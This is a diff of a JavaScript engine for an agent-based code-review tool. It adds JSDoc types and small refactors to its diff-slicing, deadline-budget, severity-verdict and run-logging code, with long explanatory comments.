     if (/^[0-7]{3}$/.test(body.slice(i + 1, i + 4).join(''))) {
@@ -1976,10 +2327,10 @@ function decodeGitPath(file) {
     }
     // Anything else git did not write: the backslash is emitted here and the character follows on
     // the next iteration, so both survive.
-    bytes.push(...enc.encode('\\'))
+    bytes.push(...utf8Bytes('\\'))
   }
   // A body that decodes to nothing falls back to the original text rather than vanishing.
-  return new TextDecoder().decode(Uint8Array.from(bytes)) || raw
+  return utf8Text(bytes) || raw
 }
 
 // How many shared files may ride along in EVERY slice. Unbounded, this works against the very cost
@@ -2000,10 +2351,15 @@ const SHARED_SUFFIXES = ['.lock', '.yml', '.yaml', '.toml', '.json']
 // nothing, while depth 3+ splits a module from its own tests.
 const GROUP_DEPTH = 2
 
+/** @param {string} file */
 function isShared(file) {
   return SHARED_SUFFIXES.some(s => file.endsWith(s))
 }
 
+/**
+ * @param {string} file
+ * @param {number} [depth]
+ */
 function groupKey(file, depth = GROUP_DEPTH) {
   const parts = String(file).split('/')
   return parts.length <= depth ? (parts.slice(0, -1).join('/') || '.') : parts.slice(0, depth).join('/')
@@ -2013,13 +2369,24 @@ function groupKey(file, depth = GROUP_DEPTH) {
 // deeper stops separating anything. Without this the top-level grouping is decorative on the shape
 // real diffs actually have: on the measured tree, depth 2 put 36 of 53 files in one slice, leaving
 // the multiplicand almost untouched — the work looks partitioned and is not.
+/**
+ * @typedef {{ key: string, files: string[] }} Group
+ */
+/**
+ * @param {Group} group
+ * @param {number} cap
+ * @param {number} depth
+ * @returns {Group[]}
+ */
 function splitDeep(group, cap, depth) {
   if (group.files.length <= cap || depth > 8) return [group]
+  /** @type {Map<string, string[]>} */
   const byKey = new Map()
   for (const f of group.files) {
     const k = groupKey(f, depth)
-    if (!byKey.has(k)) byKey.set(k, [])
-    byKey.get(k).push(f)
+    const bucket = byKey.get(k)
+    if (bucket) bucket.push(f)
+    else byKey.set(k, [f])
   }
   // A level that separates NOTHING is not a reason to stop — it is a shared prefix to walk through.
   // Every file of the measured 36-file module sits under `.../src`, so stopping at the first
@@ -2035,6 +2402,10 @@ function splitDeep(group, cap, depth) {
 // How many leading path segments two group keys share. The unit is the SEGMENT, not the character:
 // `bin/service-a` and `bin/service-admin` share one directory, while a character measure would
 // score them as nearly identical and merge them ahead of true siblings.
+/**
+ * @param {string} a
+ * @param {string} b
+ */
 function commonPrefixLength(a, b) {
   const x = String(a).split('/')
   const y = String(b).split('/')
@@ -2047,6 +2418,10 @@ function commonPrefixLength(a, b) {
 // what the lens prompt shows the agent and what the log line carries, so a key that says
 // the module's own directory tells a reader what the slice IS, where a concatenation of four
 // unrelated paths tells them only that a merge happened.
+/**
+ * @param {string} a
+ * @param {string} b
+ */
 function mergedKey(a, b) {
   const n = commonPrefixLength(a, b)
   return n > 0 ? String(a).split('/').slice(0, n).join('/') : `${a} + ${b}`
@@ -2055,6 +2430,10 @@ function mergedKey(a, b) {
 // Two merges can land on the same ancestor and produce two slices with one name. The key is what a
 // lens prompt shows and what the log line carries, so identical names make two different slices
 // indistinguishable in the transcript — and the transcript is where a run is diagnosed.
+/**
+ * @param {string} key
+ * @param {Group[]} groups
+ */
 function uniqueKey(key, groups) {
   if (!groups.some(g => g.key === key)) return key
   let n = 2
@@ -2062,6 +2441,22 @@ function uniqueKey(key, groups) {
   return `${key} (${n})`
 }
 
+/**
+ * Partition changed files into cohesive slices.
+ *
+ * Returns `[]` when slicing is not worth it — fewer files than `minFiles`, or only one group — and
+ * the caller then dispatches the lens against the whole diff as before. Returning an empty array
+ * rather than a single all-files group is deliberate: "do not slice" and "slice into one" are
+ * different instructions to the caller, and collapsing them hides which one happened.
+ *
+ * Each slice is `{ key, files }` where `files` INCLUDES the shared files, so every slice can check
+ * the code it holds against the manifest that declares it.
+ */
+/**
+ * @param {unknown} files
+ * @param {{ minFiles?: number, maxSlices?: number, maxFilesPerSlice?: number, owns?: ((f: string) => boolean) | null }} [opts]
+ * @returns {Group[]}
+ */
 function sliceDiff(files, { minFiles = 12, maxSlices = 6, maxFilesPerSlice = 0, owns = null } = {}) {
   const all = (Array.isArray(files) ? files : []).map(String).filter(Boolean)
   // `owns` is the PROFILE's question — which of the changed files this language reviews — and it is
@@ -2076,6 +2471,7 @@ function sliceDiff(files, { minFiles = 12, maxSlices = 6, maxFilesPerSlice = 0, 
   // degenerate code-free slice holding nothing but manifests, costing one agent per lens per round
   // to review no code at all. A manifest is shared BECAUSE of what it is, not because the profile
   // happens not to claim it.
+  /** @type {(f: string) => boolean} */
   const isOwned = typeof owns === 'function' ? owns : f => !isShared(f)
   const sharedAll = all.filter(isShared)
     .sort((a, b) => a.split('/').length - b.split('/').length || a.localeCompare(b))
@@ -2089,11 +2485,13 @@ function sliceDiff(files, { minFiles = 12, maxSlices = 6, maxFilesPerSlice = 0, 
   const owned = all.filter(f => isOwned(f) && !isShared(f)).concat(evicted)
   if (owned.length < minFiles) return []
 
+  /** @type {Map<string, string[]>} */
   const byKey = new Map()
   for (const f of owned) {
     const k = groupKey(f)
-    if (!byKey.has(k)) byKey.set(k, [])
-    byKey.get(k).push(f)
+    const bucket = byKey.get(k)
+    if (bucket) bucket.push(f)
+    else byKey.set(k, [f])
   }
   if (byKey.size <= 1) return []
 
@@ -2120,22 +2518,27 @@ function sliceDiff(files, { minFiles = 12, maxSlices = 6, maxFilesPerSlice = 0, 
     // is not considered at all while any merge under it exists; only when nothing fits does the
     // smallest available merge win, because at that point some slice must grow and the least bad
     // choice is the smallest one.
+    /** @type {{ i: number, j: number, shared: number, size: number } | null} */
     let best = null
+    /** @type {{ i: number, j: number, shared: number, size: number } | null} */
     let fallback = null
     for (let i = 0; i < groups.length; i++) {
       for (let j = i + 1; j < groups.length; j++) {
-        const shared = commonPrefixLength(groups[i].key, groups[j].key)
-        const size = groups[i].files.length + groups[j].files.length
+        const gi = /** @type {Group} */ (groups[i])
+        const gj = /** @type {Group} */ (groups[j])
+        const shared = commonPrefixLength(gi.key, gj.key)
+        const size = gi.files.length + gj.files.length
         const cand = { i, j, shared, size }
         if (!fallback || size < fallback.size) fallback = cand
         if (size > cap) continue
         if (!best || shared > best.shared || (shared === best.shared && size < best.size)) best = cand
       }
     }
-    best = best || fallback
-    const a = groups[best.i]
-    const b = groups[best.j]
-    groups = groups.filter((_unused, idx) => idx !== best.i && idx !== best.j)
+    // With maxSlices >= 1 and groups.length > maxSlices there are always >= 2 groups, so a pair exists.
+    const pick = /** @type {{ i: number, j: number, shared: number, size: number }} */ (best || fallback)
+    const a = /** @type {Group} */ (groups[pick.i])
+    const b = /** @type {Group} */ (groups[pick.j])
+    groups = groups.filter((_unused, idx) => idx !== pick.i && idx !== pick.j)
     groups.push({ key: uniqueKey(mergedKey(a.key, b.key), groups), files: [...a.files, ...b.files] })
   }
   groups.sort((a, b) => b.files.length - a.files.length || a.key.localeCompare(b.key))
@@ -2143,10 +2546,32 @@ function sliceDiff(files, { minFiles = 12, maxSlices = 6, maxFilesPerSlice = 0, 
   return groups.map(g => ({ key: g.key, files: [...g.files, ...shared] }))
 }
 
+/** @param {string} lens */
 function sliceableLens(lens) {
   return !WHOLE_DIFF_LENSES.includes(String(lens))
 }
 
+/**
+ * Lenses that must NOT be sliced, and why each one.
+ *
+ * These judge the diff AS A WHOLE, so a slice of it is not a smaller version of their question —
+ * it is a different and wrong question. `negative-space` looks for what is missing, and absence is
+ * only visible against the whole change. `intent` checks the author's stated claims, which are
+ * stated about the change entire. `compat` asks what an other-versioned reader makes of the new
+ * wire shapes, and a shape is only breaking in relation to every producer and consumer in the diff.
+ *
+ * `invariants` and `failure-windows` are here for a sharper reason than the other three, and they
+ * were missed on the first pass. Their briefs are MIRROR WALKS: invariants asks, for each site,
+ * where its mirror is — client against server, send against receive, offered against accepted — and
+ * failure-windows asks for interleavings BETWEEN two components. Both halves of such a pair are
+ * ordinary source files, so the shared-file rule does not reach them, and in a real tree the two
+ * halves live in different modules by construction: a handler in one binary, the contract type in
+ * another crate. Slice them and a guard present on one side with its mirror missing on the other is
+ * visible to NO agent — the one concrete class of defect this partition would otherwise delete in
+ * silence, which is the failure mode the whole engine exists to prevent.
+ *
+ * Everything else is code-intrinsic: it judges code by properties the code has in front of it.
+ */
 const WHOLE_DIFF_LENSES = ['negative-space', 'intent', 'compat', 'invariants', 'failure-windows']
 
 // How many lens agents may be in flight at once. Slicing multiplies the round-1 wave by the slice
@@ -2169,6 +2594,7 @@ const LENS_WINDOW_AGENTS = 16
 //
 // What it does do is stop git reading the name as a pattern: wildmatch is the default, so a real
 // file named `f[1].rs` does not match itself, and a leading `:` is pathspec magic.
+/** @param {unknown} file */
 function pathspecLiteral(file) {
   const f = String(file ?? '')
   // An empty name is not a pathspec, it is the absence of one. Emitting `:(literal)` for it would
@@ -2192,28 +2618,45 @@ function pathspecLiteral(file) {
 //
 // Returns `expired` and `belowFloor` as QUESTIONS rather than numbers on purpose: with no clock
 // there is no honest "remaining", and a function that invented one would be read as a measurement.
-function makeDeadlineBudget(totalMs, { floorMs = 0, schedule = setTimeout, cancel = clearTimeout } = {}) {
+/**
+ * `schedule` and `cancel` come as a pair: a handle is only ever cancelled by the scheduler that issued
+ * it, so its type `H` is the scheduler's own and stays opaque here.
+ *
+ * @template H
+ * @param {number} totalMs
+ * @param {{ floorMs?: number } & ({ schedule?: undefined, cancel?: undefined } | { schedule: (fn: () => void, ms: number) => H, cancel: (t: H) => void })} [opts]
+ */
+function makeDeadlineBudget(totalMs, { floorMs = 0, schedule, cancel } = {}) {
   const total = Number(totalMs)
   const capped = Number.isFinite(total) && total > 0 ? total : 0
   const floor = Math.max(0, Math.min(capped, Number(floorMs) || 0))
 
   let expired = capped === 0
   let belowFloor = capped === 0 || floor >= capped
+  /** @type {((v: typeof DEADLINE_HIT) => void) | null} */
   let resolveHit = null
+  // Each armed timer is kept as the call that disarms it, so the handle's type never leaves the pair
+  // that made it.
+  /** @type {(fn: () => void, ms: number) => () => void} */
+  const arm = schedule && cancel
+    ? (fn, ms) => { const t = schedule(fn, ms); return () => cancel(t) }
+    : (fn, ms) => { const t = setTimeout(fn, ms); return () => clearTimeout(t) }
+  /** @type {Array<() => void>} */
   const timers = []
 
   // The single promise every attempt races. It is created once, so a second attempt inherits
   // whatever is left of the first one's wait rather than starting a fresh one — no subtraction, no
   // clock, and nothing to get wrong when the host's timers drift.
+  /** @type {Promise<typeof DEADLINE_HIT>} */
   const hit = capped === 0
     ? Promise.resolve(DEADLINE_HIT)
     : new Promise(resolve => { resolveHit = resolve })
 
   if (capped > 0) {
-    timers.push(schedule(() => { expired = true; belowFloor = true; if (resolveHit) resolveHit(DEADLINE_HIT) }, capped))
+    timers.push(arm(() => { expired = true; belowFloor = true; if (resolveHit) resolveHit(DEADLINE_HIT) }, capped))
     // Armed at the point where the REMAINING budget drops to the floor, so "below the floor" is a
     // moment the host tells us about rather than a subtraction we perform.
-    if (floor > 0 && floor < capped) timers.push(schedule(() => { belowFloor = true }, capped - floor))
+    if (floor > 0 && floor < capped) timers.push(arm(() => { belowFloor = true }, capped - floor))
   }
 
   return {
@@ -2228,18 +2671,19 @@ function makeDeadlineBudget(totalMs, { floorMs = 0, schedule = setTimeout, cance
     // Clears the armed timers. Without it a pending timer holds the run open for the whole deadline
     // after the agent has already answered — invisible while a throw killed the run outright, and a
     // real leak once the caller swallows that throw.
-    dispose: () => { for (const t of timers) cancel(t) },
+    dispose: () => { for (const disarm of timers) disarm() },
   }
 }
 // <<< craft-inline
 
 const DEADLINE_HIT = { craftDeadline: true }
 const DEFAULT_DEADLINE_MS = 1800000
+/** @type {Record<string, number>} */
 const PHASE_DEADLINE_MS = { Scout: 900000, Gate: 1800000, Lenses: 5400000, Verify: 1800000, Adjudicate: 1800000, Synthesize: 1800000 }
 // A caller-supplied ceiling, applied to every phase that does not name its own. It only ever
 // REPLACES the per-phase table, never the explicit `deadlineMs` an individual dispatch passes —
 // preflight's 5min is a property of preflight, not a default to be overridden from the outside.
-const deadlineArg = Number(A.deadlineMs) > 0 ? Number(A.deadlineMs) : 0
+const deadlineArg = Number(A['deadlineMs']) > 0 ? Number(A['deadlineMs']) : 0
 // The CEILING on the smallest remainder a re-dispatch is allowed to be launched into — not the
 // floor itself, which is derived from the budget by `retryFloorFor` below. A POLICY DECISION, not a
 // measurement: nothing recorded derives it. It is set against the measured live distribution from
@@ -2258,7 +2702,7 @@ const RETRY_FLOOR_MS = 60000
 // been touched. `deadlineMs=30000` is a documented diagnostic setting, so this is reachable, not
 // theoretical. Half the budget is the cap: it keeps the guard meaningful at every scale, since a
 // remainder under half of what the first attempt had is a poor bet whatever the absolute numbers.
-const retryFloorMs = totalMs => Math.min(RETRY_FLOOR_MS, Math.floor((Number(totalMs) > 0 ? Number(totalMs) : 0) / 2))
+const retryFloorMs = (/** @type {unknown} */ totalMs) => Math.min(RETRY_FLOOR_MS, Math.floor((Number(totalMs) > 0 ? Number(totalMs) : 0) / 2))
 // SAID OUT LOUD, once, at the top of the run. This one argument replaces the WHOLE phase table,
 // including the 90 minutes a lens is legitimately allowed (one measured lens ran 46). Set too low it
 // kills live work by deadline, and a run full of deadline fires is indistinguishable, in the
@@ -2274,8 +2718,8 @@ if (deadlineArg) {
   // deadline log was fixed for, inverted — and worse here, because 30000 is exactly the documented
   // diagnostic value this warning exists to explain, so the one reader it was written for is the one
   // it would mislead.
-  const m = v => (v >= 60000 ? `${Math.round(v / 60000)}min` : `${Math.max(1, Math.round(v / 1000))}s`)
-  const moved = dir => Object.entries(PHASE_DEADLINE_MS).filter(([, v]) => (dir < 0 ? v > deadlineArg : v < deadlineArg)).map(([k, v]) => `${k} ${m(v)}→${m(deadlineArg)}`)
+  const m = (/** @type {number} */ v) => (v >= 60000 ? `${Math.round(v / 60000)}min` : `${Math.max(1, Math.round(v / 1000))}s`)
+  const moved = (/** @type {number} */ dir) => Object.entries(PHASE_DEADLINE_MS).filter(([, v]) => (dir < 0 ? v > deadlineArg : v < deadlineArg)).map(([k, v]) => `${k} ${m(v)}→${m(deadlineArg)}`)
   const shortened = moved(-1)
   const lengthened = moved(1)
   log(`⏱️ deadlineMs=${deadlineArg} replaces the per-phase deadline table for every phase that does not name its own`
@@ -2288,11 +2732,20 @@ if (deadlineArg) {
     // right one.
     + `${deadlineArg < RETRY_FLOOR_MS * 2 ? ` NOTE: for the phases this argument governs, the re-dispatch floor drops with it to ${Math.round(Math.floor(deadlineArg / 2) / 1000)}s, so a dead agent gets a much shorter second attempt than usual; a dispatch carrying its own deadline keeps its own floor.` : ''}`)
 }
+/** @param {AgentOpts} opts */
 function deadlineMsFor(opts) {
   const explicit = Number(opts.deadlineMs)
   if (Number.isFinite(explicit) && explicit > 0) return explicit
-  return deadlineArg || (PHASE_DEADLINE_MS[opts.phase] ?? DEFAULT_DEADLINE_MS)
+  return deadlineArg || (PHASE_DEADLINE_MS[/** @type {string} */ (opts.phase)] ?? DEFAULT_DEADLINE_MS)
 }
+/**
+ * With a tagged `schema`, the validated answer or `null` (dead, skipped, or past its deadline); without
+ * one, the agent's final text or `null` — `unknown`, since nothing here validates it.
+ * @template [T=unknown]
+ * @param {string} prompt
+ * @param {AgentOpts & { schema?: Schema<T> | undefined }} [opts]
+ * @returns {Promise<T | null>}
+ */
 async function ragent(prompt, opts = {}) {
   // deadlineMs and breaker are ours, not agent()'s — strip them so neither reaches the harness as an
   // unknown option.
@@ -2305,13 +2758,16 @@ async function ragent(prompt, opts = {}) {
   // the SAME timer rather than a fresh one computed from elapsed time.
   const budget = makeDeadlineBudget(ms, { floorMs: retryFloorMs(ms) })
   try {
-    return await withBudget(prompt, agentOpts, budget, breaker, opts)
+    // The one place the sandbox's `unknown` becomes the schema's type: agent() validates against the
+    // schema it was handed, and `opts.schema` is that schema with the type it validates into.
+    return /** @type {T | null} */ (await withBudget(prompt, agentOpts, budget, breaker, opts))
   } finally {
     // The armed timers outlive the answer otherwise, holding the run open for the whole deadline.
     budget.dispose()
   }
 }
 
+/** @param {string} prompt @param {AgentOptions} agentOpts @param {ReturnType<typeof makeDeadlineBudget>} budget @param {ReturnType<typeof makeDeathBreaker> | null | undefined} breaker @param {AgentOpts} opts @returns {Promise<unknown>} */
 async function withBudget(prompt, agentOpts, budget, breaker, opts) {
   for (let attempt = 1; ; attempt++) {
     const o = attempt === 1 ? agentOpts : { ...agentOpts, label: `retry:${agentOpts.label || 'agent'}` }
@@ -2389,21 +2845,34 @@ async function withBudget(prompt, agentOpts, budget, breaker, opts) {
 // now happen in `craft-log-run.mjs prior-round`, so no mirror is needed — a haiku still runs the
 // command and carries the bytes back, but it decides nothing.)
 // >>> craft-inline lib/run-record.mjs SEVERITIES countBySeverity summarizeFindings reviewVerdict
+/** @type {Severity[]} */
 const SEVERITIES = ['Critical', 'High', 'Medium', 'Low', 'Info']
 
+/**
+ * @param {unknown} findings
+ * @returns {Record<Severity, number>}
+ */
 function countBySeverity(findings) {
   const by = { Critical: 0, High: 0, Medium: 0, Low: 0, Info: 0 }
   for (const f of (Array.isArray(findings) ? findings : [])) {
-    if (f && Object.prototype.hasOwnProperty.call(by, f.severity)) by[f.severity] += 1
+    if (f && Object.prototype.hasOwnProperty.call(by, f.severity)) by[/** @type {Severity} */ (f.severity)] += 1
   }
   return by
 }
 
+/**
+ * @param {unknown} findings
+ * @returns {{ total: number, bySeverity: Record<Severity, number> }}
+ */
 function summarizeFindings(findings) {
   const bySeverity = countBySeverity(findings)
   return { total: SEVERITIES.reduce((n, s) => n + bySeverity[s], 0), bySeverity }
 }
 
+/**
+ * @param {unknown} confirmed
+ * @returns {string}
+ */
 function reviewVerdict(confirmed) {
   const by = countBySeverity(confirmed)
   if (by.Critical || by.High) return 'Block'
@@ -2419,12 +2888,14 @@ function reviewVerdict(confirmed) {
 // OR a maintainability finding was merged into it during cross-lens dedup (dedupPool carries every
 // contributing source in `sources`). Without the second clause a maintainability finding absorbed
 // under a same-severity non-maintainability base would silently escape the strict Block.
+/** @param {Finding} f */
 function isMaintainability(f) {
-  return (f.source || '') === 'maintainability' || (Array.isArray(f.sources) && f.sources.includes('maintainability'))
+  return (f['source'] || '') === 'maintainability' || (Array.isArray(f['sources']) && f['sources'].includes('maintainability'))
 }
+/** @param {Finding[]} confirmed */
 function finalVerdict(confirmed) {
   if (strict && confirmed.some(f => isMaintainability(f)
-    && (f.severity === 'Critical' || f.severity === 'High' || f.severity === 'Medium'))) return 'Block'
+    && (f['severity'] === 'Critical' || f['severity'] === 'High' || f['severity'] === 'Medium'))) return 'Block'
   return reviewVerdict(confirmed)
 }
 // indexProjection is NOT mirrored here any more: lib/craft-log-run.mjs imports the real one and owns
@@ -2441,7 +2912,9 @@ function finalVerdict(confirmed) {
 // The choice is deliberate and recorded (realm @nick/craft, node #34): a lost record NEVER fails the
 // run. Killing a three-hour review over a bookkeeping write would teach everyone to ignore the very
 // marker this exists to raise. It is reported instead, in the report a human actually reads.
+/** @type {string[]} */
 const telemetryLost = []
+/** @param {string} what @param {unknown} [why] */
 function noteTelemetryLoss(what, why) {
   const line = `${what}${why ? ` — ${why}` : ''}`
   telemetryLost.push(line)
@@ -2450,13 +2923,26 @@ function noteTelemetryLoss(what, why) {
 // The bookkeeping calls — the run record, the phase checkpoints, the prior-round read — must not
 // take the run down when they throw. `quietly` is the shared wrapper (lib/run-logging.mjs, inlined
 // below); here it is bound to `ragent` so the retry-once behaviour still applies underneath.
+// The wrapper is generic over the callback, so what it yields is ragent's answer, null, or the throw.
 const ragentQuietly = quietly(ragent)
+/**
+ * A quiet call's outcome split in two: the answer (null when the agent died OR threw), and the throw's
+ * message ('' when it did not throw).
+ * @template T
+ * @param {T | { __threw: string } | null} res
+ * @returns {{ answer: T | null, threw: string }}
+ */
+function splitThrew(res) {
+  if (res && typeof res === 'object' && '__threw' in res) return { answer: null, threw: String(res.__threw) }
+  return { answer: /** @type {T | null} */ (res), threw: '' }
+}
 
 // Re-review memory outcome, surfaced in the user-facing report (realm @nick/craft #104). A DETACHED
 // HEAD makes the prior-round lookup return 'no-branch', so the run silently becomes round 1 with no
 // chaining and no signal. `reReviewMemory` (below) sets this note; it is null on every run that chained
 // normally or is a genuine first review, so the section is empty then. Declared before `out()` so an
 // early exit that returns before the prior-round read sees a plain null, never a temporal-dead-zone.
+/** @type {string | null} */
 let reReviewMemoryNote = null
 // Prepended by `out()` — near the top, above the verdict — because a re-review that quietly forgot its
 // memory must be visible before the verdict, not buried after it.
@@ -2465,12 +2951,14 @@ const reReviewMemorySection = () => (reReviewMemoryNote ? `## ⚠️ Re-review m
 // (typically: the craft plugin is not enabled in this project) runs every lens on the generic subagent.
 // The review still happens — but without the agent's rubric, and the operator otherwise sees only a
 // failed probe. Stated above the verdict, with the fix; recorded on the run record.
+/** @type {{ id: string, agent: string, error: string }[]} */
 const reviewerAgentUnavailable = []
 // The agent-type match and the section text are shared with rust-audit (lib/agent-fallback.mjs).
 // >>> craft-inline lib/agent-fallback.mjs isAgentTypeMissing agentUnavailableSection
 // Only an error about the AGENT TYPE counts: a missing model, a file or tool not found inside the agent,
 // or an HTTP 404 also say "not found", and an "install the plugin" line for those would send the
 // operator to the wrong fix.
+/** @param {unknown} msg @param {string} [agent] */
 function isAgentTypeMissing(msg, agent) {
   const m = String(msg ?? '')
   return /not found/i.test(m) && (/agent type/i.test(m) || (!!agent && m.includes(agent)))
@@ -2481,6 +2969,11 @@ function isAgentTypeMissing(msg, agent) {
 // `emptied`: [{ agent, count, what }] — dispatches that came back EMPTY from the agent and were re-run
 // on the generic subagent (an unregistered agent on some runtimes, or a transient failure) — said
 // softly, without the install line. Empty string when there is nothing to say.
+/**
+ * @param {{ agent: string, what: string, error?: string }[]} missing
+ * @param {{ agent: string, count: number, what: string }[]} emptied
+ * @returns {string}
+ */
 function agentUnavailableSection(missing, emptied) {
   const hard = Array.isArray(missing) ? missing : []
   const soft = (Array.isArray(emptied) ? emptied : []).filter(x => x && x.count > 0)
@@ -2493,14 +2986,18 @@ function agentUnavailableSection(missing, emptied) {
   return `## ⚠️ Reviewer agent unavailable\n${lines.join('\n')}\n${fix}\n`
 }
 // <<< craft-inline
+/** @param {Profile} profile @param {unknown} error */
 function noteReviewerAgentMissing(profile, error) {
   if (!reviewerAgentUnavailable.some(x => x.id === profile.id)) reviewerAgentUnavailable.push({ id: profile.id, agent: profile.reviewerAgent, error: String(error || '').slice(0, 160) })
 }
 // Lens dispatches that came back EMPTY from the reviewer agent and were re-run on the generic
 // subagent. On some runtimes that is how an unknown agent type looks; it can also be a transient
 // death, so it is not taken as "missing" — but it is said, per profile, rather than staying silent.
+/** @type {Record<string, number>} */
 const reviewerAgentFallbacks = {}
+/** @type {Record<string, string>} */
 const reviewerAgentNames = {}           // profile id -> its reviewer agent type, for the report line
+/** @param {Profile} profile */
 function noteReviewerAgentFallback(profile) {
   reviewerAgentFallbacks[profile.id] = (reviewerAgentFallbacks[profile.id] || 0) + 1
   reviewerAgentNames[profile.id] = profile.reviewerAgent
@@ -2514,6 +3011,7 @@ const reviewerAgentSection = () => agentUnavailableSection(
 // Wraps every report the engine can return. Narrow on purpose: it fires only for a write that was
 // ATTEMPTED and did not land, never for telemetry that was never attempted — a marker that shows up
 // on healthy runs is a marker people stop reading, which is the symmetric half of the same defect.
+/** @param {string} reportText */
 function out(reportText) {
   return `${telemetryLostSection(telemetryLost)}${reReviewMemorySection()}${reviewerAgentSection()}${reportText}${optionalSection()}${surfaceGateSection()}`
 }
@@ -2551,6 +3049,11 @@ const LOGRUN_SCHEMA = {
 // the path this loud failure was added for.
 // A record that cannot be written is already a reported, non-fatal outcome (logRunOutcome →
 // noteTelemetryLoss → the report), so refusing to guess a path costs a marker, not a run.
+/**
+ * @param {string | undefined} craftRoot
+ * @param {string} [version]
+ * @param {string} [repo]
+ */
 function loggerPrelude(craftRoot, version = '', repo = '') {
   // ONE pipeline for every way the logger can be located, and that uniformity is the fix rather than
   // a tidy-up. Each source used to get its own treatment: an explicit `craftRoot` returned EARLY,
@@ -2637,6 +3140,7 @@ CRAFT_LOGGER=""
   // hundreds of kilobytes, and the cd — a window in which a symlink component of the unresolved
   // candidate can be re-pointed into the reviewed repository. Handing over the path that was
   // actually checked closes that window and costs nothing.
+  /** @param {string} expr */
   const tryCandidate = expr => `if [ -z "\${CRAFT_LOGGER:-}" ]; then
   CRAFT_TRY=${expr}
   craft_usable "$CRAFT_TRY" && CRAFT_LOGGER="$CRAFT_REAL"
@@ -2671,11 +3175,12 @@ fi
 // whose review agents are pointed at the same checkout (review.js does that with REPO_DIRECTIVE);
 // passed by an engine whose agents run in the session's cwd, it would file a record attributed to a
 // repository the run never looked at — a lie in the one field the store is keyed by.
+/** @param {{ record?: unknown, craftRoot?: string, repo?: string, command?: string, dir?: string, rejoin?: boolean }} [opts] */
 function logRunPrompt({ record, craftRoot = '', repo = '', command = 'write', dir = '', rejoin = false } = {}) {
   // The version comes off the RECORD rather than from a parameter of its own: it is already there,
   // and taking it from anywhere else lets the copy the logger is looked up by drift from the version
   // the record claims to be — which would file a record describing a run some other build made.
-  const version = String(record?.craftVersion ?? '')
+  const version = String((record && typeof record === 'object' ? /** @type {{ craftVersion?: unknown }} */ (record).craftVersion : undefined) ?? '')
   // `${CLAUDE_CODE_SESSION_ID:+--session "..."}` is shell-expanded INSIDE the script the logger agent
   // runs, never composed by the model — the whole point (see the header note on the payload-copy
   // incident this file already documents). `:+` is deliberate over `:-`: it fires only when the var
@@ -2716,6 +3221,13 @@ ${JSON.stringify(record, null, 2)}`
 // Copying a large record verbatim is not a low-effort task: haiku is fine for a gate-failed stub,
 // but a full review record carries every finding plus the ledger, and the cheap model is where the
 // silent truncation came from. Size the model to the payload.
+// The options are typed as the sandbox's `agent()` takes them — `effort` a literal, not a string — so an
+// engine passes them on as they are.
+/**
+ * @param {unknown} record
+ * @param {{ phase?: string }} [opts]
+ * @returns {{ label: string, phase: string, schema: typeof LOGRUN_SCHEMA, model: 'sonnet' | 'haiku', effort: 'low' }}
+ */
 function logRunDispatch(record, { phase = '' } = {}) {
   const payloadKB = JSON.stringify(record).length / 1024
   const big = payloadKB > 24
@@ -2728,13 +3240,18 @@ function logRunDispatch(record, { phase = '' } = {}) {
   }
 }
 
+/**
+ * @param {unknown} res harness result of the logger agent (model output), or a quiet call's `{ __threw }`
+ * @returns {{ ok: boolean, reason: string }}
+ */
 function logRunOutcome(res) {
+  const r = res && typeof res === 'object' ? /** @type {{ ok?: unknown, error?: unknown, __threw?: unknown }} */ (res) : null
   // A WARNING is not a loss: the record IS on disk, and only the run DIRECTORY was refused or left
   // behind. Reporting it as a lost record would send a reader hunting for a file that exists, and a
   // marker that fires on a landed write is one people stop reading. But it must not vanish either —
   // the caller gets `ok: true` with a reason to surface.
-  if (res && res.ok === true) return { ok: true, reason: String((res.error || '')).trim() }
-  return { ok: false, reason: (res && (res.__threw || res.error)) || 'the logger agent returned no result' }
+  if (r && r.ok === true) return { ok: true, reason: String((r.error || '')).trim() }
+  return { ok: false, reason: String((r && (r.__threw || r.error)) || 'the logger agent returned no result') }
 }
 
 // For the agent calls whose FAILURE is not the caller's problem: the run record, the phase
@@ -2742,12 +3259,17 @@ function logRunOutcome(res) {
 // produces review content, so a throw there should stop the run. These must not: the record is
 // written AFTER the report already exists in memory, so losing it to a bookkeeping write would
 // throw away the whole run's product.
+/**
+ * @template P, O, R
+ * @param {(prompt: P, opts: O) => Promise<R>} call a harness agent callback
+ * @returns {(prompt: P, opts: O) => Promise<R | { __threw: string }>}
+ */
 function quietly(call) {
   return async (prompt, opts) => {
     try {
       return await call(prompt, opts)
     } catch (e) {
-      return { __threw: String((e && e.message) || e) }
+      return { __threw: String((e && /** @type {{ message?: unknown }} */ (e).message) || e) }
     }
   }
 }
@@ -2758,13 +3280,14 @@ function quietly(call) {
 // on the original: the fixed staging path, the prelude ordering and the exit-code carry each had to
 // be applied twice, and each time the second copy was the one nearly missed. Same builder, one
 // difference — the checkpoint carries a phase and asks for the runDir back.
+/** @param {{ payload?: unknown, craftRoot?: string, repo?: string, phase?: string, dir?: string, rejoin?: boolean }} [opts] */
 function checkpointPrompt({ payload, craftRoot = '', repo = '', phase = '', dir = '', rejoin = false } = {}) {
   // DERIVED from the payload, never passed alongside it. As a plumbing argument with a silent ''
   // default it was forgettable, and it was duly forgotten at one of three call sites — deleting it
   // there left every gate green while that engine's checkpoints went back to refusing exactly as
   // before the fix, with finalize and prior-round succeeding beside them. A checkpoint describes the
   // same run as the record, so the version belongs on the payload anyway.
-  const version = String(payload?.craftVersion ?? '')
+  const version = String((payload && typeof payload === 'object' ? /** @type {{ craftVersion?: unknown }} */ (payload).craftVersion : undefined) ?? '')
   // See the matching note in logRunPrompt above: shell-expanded, never model-composed, and `:+`
   // degrades an unset/empty session id to no flag rather than to the literal string "".
   // Independent of `--dir`, for the reason spelled out in `logRunPrompt` above.
@@ -2854,6 +3377,10 @@ const LEDGER_TOMBSTONE_MAX = LEDGER_COPY_REFUSAL_ENTRIES - LEDGER_COPY_SAFETY_RO
 // cold read reported 14265B compact becoming 17314B. So the ratio is established and the crossing
 // is fixture-dependent — no run has been observed crossing it. The bound itself does not move; it
 // never had to. The measure was simply not measuring the thing that is paid for.
+/**
+ * @param {unknown} item
+ * @returns {number}
+ */
 function payloadBytes(item) {
   const pretty = JSON.stringify(item, null, 2)
   if (typeof pretty !== 'string') return 2
@@ -2861,19 +3388,25 @@ function payloadBytes(item) {
   return pretty.length + pretty.split('\n').length * 4 + 2
 }
 
+/**
+ * @param {unknown} ledger
+ * @param {{ max?: number, maxShards?: number }} [opts]
+ * @returns {{ ledgerShard: { index: number, of: number, total: number }, ledgerItems: unknown[] }[]}
+ */
